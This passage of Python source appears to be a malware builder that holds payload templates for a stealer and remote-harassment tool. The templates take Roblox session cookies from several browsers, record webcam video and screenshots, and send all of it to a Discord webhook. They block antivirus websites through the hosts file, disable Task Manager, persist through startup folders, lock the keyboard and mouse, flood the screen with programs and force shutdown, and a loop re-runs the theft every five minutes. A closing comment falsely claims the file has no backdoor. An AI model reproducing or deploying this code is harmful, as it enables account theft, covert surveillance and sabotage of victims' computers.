                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R0b10xC00ki3 = r'''
def R0b10x_C00ki3():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook, Embed
    import discord

    c00ki35_list = []
    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return c00kie, n4vigator
        except:
            return None, None

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3:
            if c00ki3 not in c00ki35_list:
                c00ki35_list.append(c00ki3)
                try:
                    inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
                    api = json.loads(inf0.text)
                except:
                    pass

                us3r_1d_r0b10x = api.get('id', "None")
                d1spl4y_nam3_r0b10x = api.get('displayName', "None")
                us3rn4m3_r0b10x = api.get('name', "None")
                r0bux_r0b10x = api.get("RobuxBalance", "None")
                pr3mium_r0b10x = api.get("IsPremium", "None")
                av4t4r_r0b10x = api.get("ThumbnailUrl", "None")
                bui1d3r5_c1ub_r0b10x = api.get("IsAnyBuildersClubMember", "None")
        
                size_c00ki3 = len(c00ki3)
                middle_c00ki3 = size_c00ki3 // 2
                c00ki3_part1 = c00ki3[:middle_c00ki3]
                c00ki3_part2 = c00ki3[middle_c00ki3:]

                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

                embed = discord.Embed(
                    title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                    color=color_embed
                )
                embed.set_footer(text=footer_text, icon_url=avatar_embed)
                embed.set_thumbnail(url=av4t4r_r0b10x)
                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator.replace("_", " ")}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
                embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
                embed.add_field(name=":moneybag: Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
                embed.add_field(name=":tickets: Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
                embed.add_field(name=":construction_site: Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
                embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
                embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)

                w3bh00k.send(embed=embed, username=username_embed,
                                avatar_url=avatar_embed)
                
    if not c00ki35_list:
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        embed = Embed(
            title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:', 
            description=f"No roblox cookie found.",
            color=color_embed)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

C4m3r4C4ptur3 = r'''
def C4m3r4_C4ptur3():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime

    try:
        from datetime import datetime
        name_file_capture = f"CameraCapture_{username_pc}.avi"
        time_capture = 10
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            Clear()
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            embed = Embed(
                title=f'Camera Capture `{username_pc} "{ip_address_public}"`:', 
                description=f"No camera found.",
                color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return

        def c4ptur3(path_file_capture):
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
            time_start = datetime.now()
            Clear()
            while (datetime.now() - time_start).seconds < time_capture:
                Clear()
                ret, frame = cap.read()
                if not ret:
                    Clear()
                    break
                out.write(frame)

            cap.release()
            out.release()
            Clear()

        try:
            path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
            c4ptur3(path_file_capture)
        except:
            path_file_capture = name_file_capture
            c4ptur3(path_file_capture)

        embed = Embed(title=f"Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
        embed.set_footer(text=footer_text, icon_url=avatar_embed)

        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        with open(path_file_capture, "rb") as f:
            w3bh00k.send(
                embed=embed,
                file=File(f, filename=name_file_capture),
                username=username_embed,
                avatar_url=avatar_embed
            )
            
        if os.path.exists(path_file_capture):
            os.remove(path_file_capture)
        Clear()
    except:
        Clear()
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Op3nU53rPr0fi1353tting5 = r'''
def Op3n_U53r_Pr0fi13_53tting5():
    import subprocess
    import time
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Scr33n5h0t = r'''
def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File

    try:
        name_file_screen = f"Screenshot_{username_pc}.png"

        def capture(path):
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            image.save(path)
        
        try:
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)

        embed = Embed(title=f"Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        embed.set_image(url=f"attachment://{name_file_screen}")
        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(
                embed=embed,
                file=File(f'{path_file_screen}', filename=name_file_screen),
                username=username_embed,
                avatar_url=avatar_embed
            )

        if os.path.exists(path_file_screen):
            os.remove(path_file_screen)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckW3b5it3 = r'''
def B10ck_W3b5it3():
    import os

    "Perm Admin Required"
    try:
        d1r3ct0ry = os.getcwd()
        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]

        def b10ck_w3b5it3(website):
            hosts_path = f"{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
            if os.path.exists(hosts_path):
                pass
            else:
                hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"

            redirect = "127.0.0.1"
            with open(hosts_path, "a") as file:
                file.write("\n" + redirect + " " + website)
        
        w3b51t35_t0_8l0ck = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for w3b51t3 in w3b51t35_t0_8l0ck:
            b10ck_w3b5it3(w3b51t3)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rtup = r'''
def St4rtup():
    import os
    import sys
    import shutil

    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            ext = "exe"
        elif file_path.endswith(".py"):
            ext = "py"

        new_name = f"ㅤ.{ext}"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        path_new_file = os.path.join(folder, new_name)

        shutil.copy(file_path, path_new_file)
        os.chmod(path_new_file, 0o777) 
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rt = r'''
payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)
try: B10ck_K3y()
except: pass
try: B10ck_T45k_M4n4g3r()
except: pass
try: B10ck_W3b5it3()
except: pass
try: St4rtup()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: Shutd0wn()
except: pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)

try: F4k3_3rr0r()
except: pass
try: Sp4m_0p3n_Pr0gr4m()
except: pass
try: B10ck_M0u53()
except: pass

Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R3st4rt = r'''
while True:
    time.sleep(300)

    payload = {
    'content': f'****╔════════════════════Injection═══════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(w3bh00k_ur1, json=payload)
    try: B10ck_K3y()
    except: pass
    try: B10ck_T45k_M4n4g3r()
    except: pass
    try: B10ck_W3b5it3()
    except: pass
    try: Sy5t3m_Inf0()
    except: pass
    try: C4m3r4_C4ptur3()
    except: pass
    try: Scr33n5h0t()
    except: pass
    try: Di5c0rd_T0k3n()
    except: pass
    try: Br0w53r_5t341()
    except: pass
    try: R0b10x_C00ki3()
    except: pass
    try: Shutd0wn()
    except: pass

    Clear()
    payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(w3bh00k_ur1, json=payload)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

def F4k33rr0r(title, message):
    F4k33rr0r = f'''
def F4k3_3rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("{title}", "{message}")
'''
    return F4k33rr0r

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Shutd0wn = r'''
def Shutd0wn():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4m0p3nPr0gr4m = r'''
def Sp4m_0p3n_Pr0gr4m():
    import subprocess
    import threading

    def sp4m():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=sp4m)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    while True:
        request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckK3y = r'''
def B10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def Unb10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckT45kM4n4g3r = r'''
def B10ck_T45k_M4n4g3r():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
    Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckM0u53 = r'''
def B10ck_M0u53():
    import pyautogui
    import keyboard
    import threading
    import time
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

    while True:
        try:
            B10ck_M0u53()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass
'''

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝